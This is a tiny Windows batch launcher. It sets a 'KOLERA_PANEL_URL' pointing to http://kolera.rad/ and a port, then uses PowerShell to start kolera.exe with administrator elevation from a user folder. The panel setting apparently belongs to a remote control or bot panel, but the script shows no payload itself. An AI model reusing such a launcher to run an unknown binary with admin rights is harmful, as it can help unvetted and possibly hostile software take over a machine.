@echo off
setlocal
set KOLERA_PANEL_URL=http://kolera.rad/
set PORT=80
cd /d "C:\Users\japon\mi madre la perra\"
powershell -NoLogo -NoProfile -Command "Start-Process -FilePath 'kolera.exe' -WorkingDirectory 'C:\Users\japon\mi madre la perra\' -Verb RunAs"
